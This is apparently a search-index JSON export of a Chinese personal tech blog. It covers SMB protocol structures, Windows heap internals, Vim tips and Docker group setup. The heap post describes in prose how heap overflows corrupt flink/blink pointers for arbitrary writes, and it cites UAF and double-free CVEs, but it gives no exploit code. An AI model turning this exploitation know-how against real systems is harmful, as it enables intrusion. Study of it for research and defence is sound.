Mapbox shortcode  支持基于 APlayer 和 MetingJS 的音乐播放器 shortcode  支持 Bilibili 视频 shortcode  支持多种注释的 shortcode  支持自定义样式的 shortcode  支持自定义脚本的 shortcode  支持基于 TypeIt 的打字动画 shortcode  支持基于 Smooth Scroll 的滚动动画  支持基于 cookieconsent 的 Cookie 许可横幅 … ","date":"2019-08-02","objectID":"/about/:0:1","tags":null,"title":"关于 V4ler1an","uri":"/about/"},{"categories":null,"content":"许可协议 LoveIt 根据 MIT 许可协议授权。 更多信息请查看 LICENSE 文件。 LoveIt 主题中用到了以下项目，感谢它们的作者： normalize.css Font Awesome Simple Icons Animate.css Smooth Scroll autocomplete.js Lunr.js algoliasearch lazysizes object-fit-images Twemoji lightgallery.js clipboard.js Sharer.js TypeIt $ \\KaTeX $ mermaid ECharts Mapbox GL JS APlayer MetingJS Gitalk Valine cookieconsent ","date":"2019-08-02","objectID":"/about/:0:2","tags":null,"title":"关于 V4ler1an","uri":"/about/"},{"categories":["Tech"],"content":"最近一直在研究SMB，由于其之前爆发过诸多漏洞，现将自己学到的知识简单做个整理总结。","date":"2019-05-30","objectID":"/2019/05/SMB/","tags":["SMB","Windows"],"title":"SMB协议简单总结","uri":"/2019/05/SMB/"},{"categories":["Tech"],"content":"SMB协议 ","date":"2019-05-30","objectID":"/2019/05/SMB/:1:0","tags":["SMB","Windows"],"title":"SMB协议简单总结","uri":"/2019/05/SMB/"},{"categories":["Tech"],"content":"一. Client和Server的连接过程 client和server首先建立NetBIOS session clent和server确定使用的smb协议的dialect（定义了特定协议版本的消息包集） client登录到server client连接server上的一个share client在share中打开文件 client开始读取文件 client和server首先要建立全双工的TCP连接，然后client建立并发送一个NetBIOS session请求包。 如果请求包格式化正确，server返回一个包含着确认session建立成功的消息包。然后，client 开始想server发送第一个smb协议数据包。 ","date":"2019-05-30","objectID":"/2019/05/SMB/:1:1","tags":["SMB","Windows"],"title":"SMB协议简单总结","uri":"/2019/05/SMB/"},{"categories":["Tech"],"content":"二. SMB协议涉及到的数据包分析 Packet1. SMB_COM_NEGOTIATE Direction:C-\u003eS\rDescription:client想server发送smb dialect的确认信息，server返回一个包含着dialects\r的字符串的数据包。\r Packet2. SMB_COM_NEGOTIATE Direction:S-\u003eC\rDescription:server相应client的请求，确定将在session中使用的smb dialect。server返回\r的数据包中还包括一个8字节的随机字符串，该字符串将在系一部中用于在登录过程中对客户端\r进行身份验证。\r Packet3. SMB_COM_SESSION_SETUP_ANDX Direction:C-\u003eS\rDescription:该数据包包含着有关client功能的信息，因此即使server实现了share-level\rsecurity model，也必须要发送该数据包。\r Packet4. SMB_COM_SESSION_SETUP_ANDX Direction:S-\u003eC\rDescription:如果server接受了challenge/response，则返回给client的数据包中将包含\r一个有效的UID。如果不接受，则在数据包中返回error code，并拒绝访问。\r Packet5. SMB_COM_TREE_CONNECT_ANDX Direction：C-\u003eS\rDescription:client对share发起访问，该数据包中包含UNC格式的绝对共享路径。\r Packet6. SMB_COM_TREE_CONNECT_ANDX Direction:S-\u003eC\rDescription:如果server授予了client访问权限，则server返回与该数据包中的share对应的\r16位的TID。如果share不存在或者client没有足够的权限，则server返回error code并拒绝访问。\r Packet7. SMB_COM_OPEN_ANDX Direction:C-\u003eS\rDescription:client请求server代表自己在share中打开文件，该数据包中包含要打开的文件的名称。\r Packet8. SMB_COM_OPEN_ANDX Direction:S-\u003eC\rDescription:如果授予了对文件的访问权限，则server返回请求文件的ID；如果文件不存在或者\r用户没有足够的权限访问该文件，则返回error code并拒绝client的访问。\r Packet9. SMB_COM_READ_ANDX Direction:C-\u003eS\rDescription:client请求server代替自己读取文件中的数据并返回给自己。打开文件时client\r获取的文件ID包含在该数据包中，以便识别server应该从哪个打开的文件中读取数据。\r Packet10. SMB_COM_READ_ANDX Direction:S-\u003eC\rDescription：server返回client请求的文件数据。由于已授予对server，share和文件的访问\r权限，一般不会出现问题。但是在某些特殊情况下会发生错误，例如在打开文件和从文件中读取数据\r这两步之间，对share的访问权限遭到了更改，就会发生错误。\r ","date":"2019-05-30","objectID":"/2019/05/SMB/:1:2","tags":["SMB","Windows"],"title":"SMB协议简单总结","uri":"/2019/05/SMB/"},{"categories":["Tech"],"content":"三. SMB Message结构 SMB Message包括一个固定长度的header（32字节）、一个可变长度的Parameter block（最大\r为64kb）、一个可变长度的Data block。\r The SMB Message Header 32字节的固定长度。\rSMB_Header\r{\rUCHAR Protocol[4];\rUCHAR Command;\rSMB_ERROR Status;\rUCHAR Flags;\rUSHORT Flags2;\rUSHORT PIDHigh;\rUCHAR SecurityFeatures[8];\rUSHORT Reserved;\rUSHORT TID;\rUSHORT PIDLow;\rUSHORT UID;\rUSHORT MID;\r}\r简单说一下比较重要的部分：\r Protocol:(4 字节)需要包含\"\\xff\",“S”,“M”,“B” Flags2:保留位必须设置为0，且需要重点关注SMB_FLAGS2_DFS字段，如果该位被设置为1，则任何的文件路径名都应该在DFS中进行处理（这也是很多漏洞触发点，因为对于文件路径规范化处理函数，有漏洞） SecuritySignature (8 bytes): 如果已协商SMB签名，则此字段必须包含一个8字节的加密消息签名，可用于检测消息是否在传输过程中被修改。 消息签名的使用与无连接传输是互斥的。 Parameter Block 在CIFS方言中，SMB_Parameters.Words数组可以包含任意结构。 SMB_Parameters.Words结构的格式是针对每个命令消息单独定义的。 Words数组的大小仍然被测量为字节对的计数。其结构如下所示： SMB_Parameters\r{\rUCHAR WordCount;\rUSHORT Words[WordCount] (variable);\r}\r Words (variable): The message-specific parameters structure. The size of this field MUST be (2 x WordCount) bytes. If WordCount is 0x00, this field is not included. Data Block 结构与Parameter Block相似：\rSMB_Data\r{\rUSHORT ByteCount;\rUCHAR Bytes[ByteCount] (variable);\r}\r Batched Message(AndX Messages) 主要是为了在一个message中发送多个request或者response command，而只需要一个smb header即可。\rIn AndX Messages, only one SMB Header (section 2.2.3.1) is sent. The header is then followed by zero or more Parameter and Data block pairs, each corresponding to an additional command request/response. There is no limit on the number of block pairs in a message specifically, only on the total message size. *The total size of a Batched Message MUST NOT exceed the negotiated MaxBufferSize.* AndX Messages contain a construct, conceptually similar to a linked-list, that is used to connect the batched block pairs. The resulting list is referred to as an AndX Chain.\r其结构如下：\rAndX\r{\rUCHAR AndXCommand;\rUCHAR AndXReserved;\rUSHORT AndXOffset;\r}\r AndXOffset (2 bytes): The offset in bytes, relative to the start of the SMB Header, of the next Parameter block in the AndX Message. This offset is independent of any other size parameters or offsets within the command. This offset can point to a location past the end of the current block pair. The AndX construct is located at the start of the Parameter block of an AndX command request/response. ","date":"2019-05-30","objectID":"/2019/05/SMB/:2:0","tags":["SMB","Windows"],"title":"SMB协议简单总结","uri":"/2019/05/SMB/"},{"categories":["Tech"],"content":"四. SMB COMMANDS 由于commands数量较多，此处给出微软官方的命令解释地址。\r[Microsoft Docs]: \u003chttps://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-cifs/5cd5747f-fe0b-40a6-89d0-d67f751f8232\u003e\r ​ ","date":"2019-05-30","objectID":"/2019/05/SMB/:3:0","tags":["SMB","Windows"],"title":"SMB协议简单总结","uri":"/2019/05/SMB/"},{"categories":["Tech"],"content":"Windows Heap是一个重要的内存区域，关于堆的漏洞屡见不鲜，特此总结学习。","date":"2019-05-29","objectID":"/2019/05/Windows-Heap/","tags":["Security","Widnows Heap"],"title":"Windows Heap 漫游","uri":"/2019/05/Windows-Heap/"},{"categories":["Tech"],"content":"在系统安全研究中，堆，是一个极其重要的内存区域以及研究的热点。堆，区别于栈区、全局数据区以及代码区，它的主要作用是允许程序在运行时动态地申请某个大小的内存空间。本文将从宏观到微观，简单梳理总结一下Windows系统中的堆相关的知识以及常见的堆利用漏洞，方便自己后续的学习。 Windows堆的历史 到目前为止，由于微软并没有完全公开Windows中堆管理的细节，所以现在对Windows下堆的了解都是基于技术爱好者、黑客、安全专家以及逆向工程师等的个人研究成果。这些前辈的努力工作，为我们留下了极其宝贵的研究资料。现在，我们已经可以基本清楚了部分Windows系统中的堆管理策略、与攻击相关的数据结构和算法等。此处，有几位技术精湛、贡献卓越的前辈值得我们铭记： Halvar Flake：2002年的Black Hat大会上，他在演讲“Third Generation Exploitation”中首次挑战Windows的堆溢出，并揭秘了堆中一些重要的数据结构和算法。 David Litchfield: David 在2004年的Black Hat上演讲的\"Windows Heap Overflows\"首次比较全面地介绍了Windows 2000平台下堆溢出地技术细节，包括重要数据结构、堆分配算法、利用思路、劫持进程地方法、执行shellcode时会遇到的问题等。 Matt Conover: 在其演讲的\"XP SP2 Heap Exploitation\"中全面揭示了Windows堆中与溢出相关的所有数据结构和分配策略，而且还提出了突破Windows XP SP2平台下诸多安全机制的防护进行堆溢出的方法。 Windows堆的数据结构与管理机制 堆不同于栈，其管理机制错综繁杂，操作系统一般会直接提供一套API来将底层的复杂的堆管理屏蔽掉。程序员在使用堆时可以只做三件事：申请一定大小的内存、使用内存、释放内存。 虽然对于程序员来说，对堆的操作变得简单，但是对于堆管理系统来说，需要有一套完善的机制来响应程序的内存使用申请，这意味着需要在“杂乱”的堆区中“寻找”到“合适”的、空闲的内存区域，以指针形式返回给程序。 “杂乱”：堆区在经过反复的申请、释放操作后，原本大片连续的空闲内存区域可能变得支离破碎，呈现出大小不等且空闲块、占用块相间隔的凌乱状态。 “寻找”：堆管理程序必须能够在“杂乱”的堆内存区域中找到程序申请的堆内存块，寻找过程中需要辨别哪些堆块是正在使用的，哪些堆块是已经释放的，处于空闲状态的。 “合适”：堆管理程序需要按需分配堆内存，不能过大也不能不够，需要“恰到好处”。 ","date":"2019-05-29","objectID":"/2019/05/Windows-Heap/:0:0","tags":["Security","Widnows Heap"],"title":"Windows Heap 漫游","uri":"/2019/05/Windows-Heap/"},{"categories":["Tech"],"content":"堆中的数据结构 ","date":"2019-05-29","objectID":"/2019/05/Windows-Heap/:1:0","tags":["Security","Widnows Heap"],"title":"Windows Heap 漫游","uri":"/2019/05/Windows-Heap/"},{"categories":["Tech"],"content":"堆块 传统内存统计单位往往是以字节位标准，但处于性能的考虑，堆内存按照大小不同组成不同的块，以堆块为单位进行标识。一个堆块包括两个部分：header部分和data部分。header是一个堆块头部的几个字节，用来标识这个堆块自身的信息。data是用来在最终分配给用户使用的数据区。\r ","date":"2019-05-29","objectID":"/2019/05/Windows-Heap/:1:1","tags":["Security","Widnows Heap"],"title":"Windows Heap 漫游","uri":"/2019/05/Windows-Heap/"},{"categories":["Tech"],"content":"堆表 为了合理地组织堆区中的空闲堆块，提出了堆表的概念。堆表的数据结构决定了整个堆区的组织方式，一般位于堆区的起始位置，用于索引堆区中空闲堆块的重要信息，包括堆块的位置、大小、状态（空闲or占用）。\r下图是一个简单的堆内存组织图：\r 堆表并不索引所有的堆块。在Windows系统中，处于占用态的堆块由正在使用它的程序索引，处于空闲态的堆块由堆表索引。空闲的堆块大小不一，而且其使用频率不定。可能较小的堆块的使用频率更高，较大的使用频率较低，这需要对这两种情况进行不同的索引方式以提高效率。该问题主要通过不同类型的堆表进行解决，其中，最重要的堆表有两种：空闲双向链表Freelist和快速单向链表Lookaside。\r 1. 空闲双向链表Freelist 顾名思义，它是一个双向链表。在空闲堆块的header中有一对指针，用于将空闲堆块链接成双向链表。而且，在该双向链表中，根据堆块的大小不同，一共被分成了128条。 对于这128条链表的组织，由堆区一开始的堆表区中的一个有128项的指针数组索引，称为Freelist arrary。该数组的每一项都包含两个指针，用于标识一条空闲双向链表。其结构如下所示： 从上面空闲双向链表结构图中我们可以清晰地看到它的内部结构。第二项索引free[1]标识了堆区中所有大小为8字节的空闲堆块，第三项索引free[2]标识了堆区中所有大小为16字节的空闲堆块，之后的每各索引项标识堆区中的空闲堆块都逐次递增8字节，最后一个索引项free[127]标识的堆块的大小为1016字节。由以上数据，我们可以得到空闲堆块大小与索引项之间的对应关系： 空闲堆块大小 = 索引项 * 8 （单位：字节） 将不同大小的空闲堆块放入不同的空闲双向链表中就可以方便、高效地对堆区中不同大小的空闲堆块进行管理，也可以提高检索效率。 需要额外注意的是，上图中的第一个索引项free[0]，该链表索引的空闲堆块的大小不满足上面的公式，该索引项中链接的空闲堆块的大小都大于等于1024字节（小于512KB），这些空闲堆块按照升序在free[0]链表中依次排列。 2. 快速单向链表Lookaside 与Freelist不同，Lookaside是一个单向链表，这是Windows为了加速堆块分配而采用的一种堆表。Lookaside中的空闲堆块从来不会发生堆块合并（其中的空闲堆块header被设置为占用态，以防止堆块合并），因此可以大大提高堆块分配的速度。 Lookaside一共有128项，每一项索引的空闲堆块都以单链表的形式进行组织。其结构如下图所示： 此外，Lookaside还有一个特殊的特点，它总是被初始化为空，而且每条Lookaside最多只有4个节点。 ","date":"2019-05-29","objectID":"/2019/05/Windows-Heap/:1:2","tags":["Security","Widnows Heap"],"title":"Windows Heap 漫游","uri":"/2019/05/Windows-Heap/"},{"categories":["Tech"],"content":"堆中的堆块操作 ","date":"2019-05-29","objectID":"/2019/05/Windows-Heap/:2:0","tags":["Security","Widnows Heap"],"title":"Windows Heap 漫游","uri":"/2019/05/Windows-Heap/"},{"categories":["Tech"],"content":"1. 堆块分配 堆块的分配可以分为三类，Lookaside分配、普通Freelist分配以及0号Freelist（free[0]）分配。 Lookaside分配: 寻找到大小匹配的空闲堆块 -\u003e 修改状态为占用 -\u003e 从堆表中解链 -\u003e 给程序返回一个指向堆块的指针 普通Freelist分配： 寻找最优的空闲堆块 -\u003e 若失败，寻找次优空闲堆块分配 0号Freelist分配： 从free[0]反向寻找最后一个堆块（最大的堆块） -\u003e 若满足要求，再正向搜索最小的满足要求的空闲堆块 堆块分配中的“找零钱”现象： 当在Freelist中无法找到刚好合适的堆块时，此时会分配一个稍微大一点的空闲堆块给程序使用，其过程是首先在这个大块中分配出大小刚好等于请求堆块大小的堆块给程序，然后剩下的部分修改堆块的header信息，重新链入到Freelist合适的位置。这种方法节约了内存的使用，不会造成大量的内存浪费。 由于Lookaside只有在精确匹配时才会分配，因此不存在“找零钱”现象。 ","date":"2019-05-29","objectID":"/2019/05/Windows-Heap/:2:1","tags":["Security","Widnows Heap"],"title":"Windows Heap 漫游","uri":"/2019/05/Windows-Heap/"},{"categories":["Tech"],"content":"2. 堆块释放 堆块的释放主要是将堆块修改为空闲状态，然后将堆块链入相应的堆表。所有的释放块都链入堆表的末尾，分配的时候也会首先从堆表末尾分配。 ","date":"2019-05-29","objectID":"/2019/05/Windows-Heap/:2:2","tags":["Security","Widnows Heap"],"title":"Windows Heap 漫游","uri":"/2019/05/Windows-Heap/"},{"categories":["Tech"],"content":"3. 堆块合并 为了减少内存中的内存碎片，合理有效地利用内存，堆管理系统还需要进行堆块合并操作。当两个空闲堆块彼此相邻的时候就会进行堆块合并操作。其过程大致为： 将两个块从Freelist中解链 -\u003e 合并堆块 -\u003e 调整合并后堆块的header信息 -\u003e 将合并后的堆块放入Freelist合适的位置 Windows堆分配函数 Windows平台下的堆管理架构可以用下图来概述： 在Windows系统中，提供了许多类型的堆分配函数，大部分函数都可以在微软的官方文档中找到详细说明。各个函数之间调用关系如下图所示： 从上图中我们可以看到，虽然Windows中关于堆分配的函数有很多，但是各个函数最终都要使用RtlAllocateHeap()函数进行分配，该函数位于ntdll.dll文件中。或者可以换个角度看待这个问题，只要研究清楚了该函数，即可研究清楚Windows中的堆。 常见Windows堆漏洞类型 Windows平台下的堆管理机制与Linux平台下的堆管理机制虽然有不同的地方，但在漏洞利用方面，经常见到的漏洞类型大同小异，可能在漏洞利用的细节上不同。以下将简单介绍一下常见的堆漏洞类型以及比较经典的Windows堆漏洞。\r ","date":"2019-05-29","objectID":"/2019/05/Windows-Heap/:2:3","tags":["Security","Widnows Heap"],"title":"Windows Heap 漫游","uri":"/2019/05/Windows-Heap/"},{"categories":["Tech"],"content":"1. 堆溢出漏洞 堆溢出与栈溢出在本质上是相通的，都是精心构造特制的数据去覆盖正常数据，覆盖到某个特定位置后跳转到自己的shellcode的地址去执行shellcode。但从技术层面来讲，堆溢出比栈溢出难度更大。而且现在基本很少有软件存在典型的栈溢出漏洞，相反由于堆的复杂性，很多软件仍然存在诸多的堆溢出漏洞。 堆溢出利用的核心是使用精心构造的数据去溢出下一个堆块的header部分，修改堆块中的两个指针：前向指针(flink)和后向指针(blink)，这样的操作会导致在堆块进行分配、合并、释放等操作时出现异常，攻击者可以在这三个操作的过程中寻找到向内存任意地址读写任意数据的机会，从而实现堆溢出攻击，在《0 day安全：软件漏洞分析技术》中，这种机会被称为\"DWORD SHOOT\"。 ","date":"2019-05-29","objectID":"/2019/05/Windows-Heap/:3:0","tags":["Security","Widnows Heap"],"title":"Windows Heap 漫游","uri":"/2019/05/Windows-Heap/"},{"categories":["Tech"],"content":"2. UAF漏洞 Use After Free（UAF），释放后重引用漏洞， 一块内存已经被释放后，在程序中仍然存在对该块内存的引用，并且在一定情况下可能使用内存中的数据。由于这块原本已经被释放不应该再使用的内存被程序中的其他地方进行了使用，因此该块内存中的数据是不可信的。这种方式甚至会造成内存崩溃或者任意代码执行。此类型的漏洞在浏览器中比较常见。 UAF漏洞比较有名的是CVE-2013-1347 Microsoft IE CGenericElement UAF漏洞，该漏洞被用在了当时著名的“水坑”事件中，影响巨大。 ","date":"2019-05-29","objectID":"/2019/05/Windows-Heap/:4:0","tags":["Security","Widnows Heap"],"title":"Windows Heap 漫游","uri":"/2019/05/Windows-Heap/"},{"categories":["Tech"],"content":"3. Double Free漏洞 双重释放漏洞，主要是由于对同一块内存进行二次重复释放。在释放过程中，邻近的已释放的堆块存在合并动作，这会导致原有的堆header信息发生改变，同时前向指针和后向指针也会发生改变，随后再对其中的地址进行引用，就会导致访问异常，最终导致程序崩溃或者任意代码执行。从另外一个角度来说，由于发生了对释放后的堆块内存的引用，因此Double Free漏洞也是UAF漏洞的一个子集。 双重释放漏洞比较经典的是CVE-2014-1767，该漏洞位于Windows AFD.sys文件中。在2014年的Pwn2Own上，Siberas团队使用该漏洞进行内核提权，绕过了Windows 8.1平台上的IE11沙箱，并在随后获得了Pwnie Awards的“最佳提权漏洞奖”。该漏洞通杀Windows系统，影响较大。 参考文献 《0 day安全：软件漏洞分析技术》 《漏洞战争：软件分析精要》 ","date":"2019-05-29","objectID":"/2019/05/Windows-Heap/:5:0","tags":["Security","Widnows Heap"],"title":"Windows Heap 漫游","uri":"/2019/05/Windows-Heap/"},{"categories":["Tips"],"content":"Vim Tips and tricks","date":"2018-02-09","objectID":"/2018/02/09/vim-tips/","tags":["Tips","Vim"],"title":"Vim Tips","uri":"/2018/02/09/vim-tips/"},{"categories":["Tips"],"content":"vim graphical cheat sheet ","date":"2018-02-09","objectID":"/2018/02/09/vim-tips/:1:0","tags":["Tips","Vim"],"title":"Vim Tips","uri":"/2018/02/09/vim-tips/"},{"categories":["Tips"],"content":"Vim Jumps ^ — Move to start of line $ — Move to end of line b — Move back a word w — Move forward a word e — Move to the end of the next word Ctrl-o and Ctrl-i to go to the previous/next location you jumped to ``(two backticks) jump back to where you were gi go back to the last place you inserted a text and enter insert mode ","date":"2018-02-09","objectID":"/2018/02/09/vim-tips/:2:0","tags":["Tips","Vim"],"title":"Vim Tips","uri":"/2018/02/09/vim-tips/"},{"categories":["Tips"],"content":"Vim Navigations { and } jump paragraph back and forth Ctrl-F/B move one screen back and forth Search the word under cursor, then n/p to jump to next/previous ","date":"2018-02-09","objectID":"/2018/02/09/vim-tips/:3:0","tags":["Tips","Vim"],"title":"Vim Tips","uri":"/2018/02/09/vim-tips/"},{"categories":["Tips"],"content":"Enable Vim mode in bash vi ~/.inputrc set editing-mode vi ","date":"2018-02-09","objectID":"/2018/02/09/vim-tips/:4:0","tags":["Tips","Vim"],"title":"Vim Tips","uri":"/2018/02/09/vim-tips/"},{"categories":["Tips"],"content":"Enable system clipboard upport See if system clipboard is supported: $ vim --version | grep clipboard -clipboard +iconv +path_extra -toolbar +eval +mouse_dec +startuptime -xterm_clipboard Rinstall vim as vim-gnome: sudo apt-get install vim-gnome Select what you want using the mouse - then type to copy to clipboard: \"+y To paste to vim from clipboard type: \"+p ","date":"2018-02-09","objectID":"/2018/02/09/vim-tips/:5:0","tags":["Tips","Vim"],"title":"Vim Tips","uri":"/2018/02/09/vim-tips/"},{"categories":["Tips"],"content":"Others Ex: open the current directory set number: show line number ","date":"2018-02-09","objectID":"/2018/02/09/vim-tips/:6:0","tags":["Tips","Vim"],"title":"Vim Tips","uri":"/2018/02/09/vim-tips/"},{"categories":["Tips"],"content":"如何使用非root用户执行docker命令","date":"2018-02-09","objectID":"/2018/02/09/docker-without-sudo/","tags":["Tips","Docker"],"title":"如何使用非root用户执行docker命令","uri":"/2018/02/09/docker-without-sudo/"},{"categories":["Tips"],"content":"Add the docker group if it doesn’t already exist: sudo groupadd docker ","date":"2018-02-09","objectID":"/2018/02/09/docker-without-sudo/:0:1","tags":["Tips","Docker"],"title":"如何使用非root用户执行docker命令","uri":"/2018/02/09/docker-without-sudo/"},{"categories":["Tips"],"content":"Add the connected user “$USER” to the docker group. Change the user name to match your preferred user if you do not want to use your current user: sudo gpasswd -a $USER docker ","date":"2018-02-09","objectID":"/2018/02/09/docker-without-sudo/:0:2","tags":["Tips","Docker"],"title":"如何使用非root用户执行docker命令","uri":"/2018/02/09/docker-without-sudo/"},{"categories":["Tips"],"content":"Either do a newgrp docker or log out/in to activate the changes to groups. ","date":"2018-02-09","objectID":"/2018/02/09/docker-without-sudo/:0:3","tags":["Tips","Docker"],"title":"如何使用非root用户执行docker命令","uri":"/2018/02/09/docker-without-sudo/"}]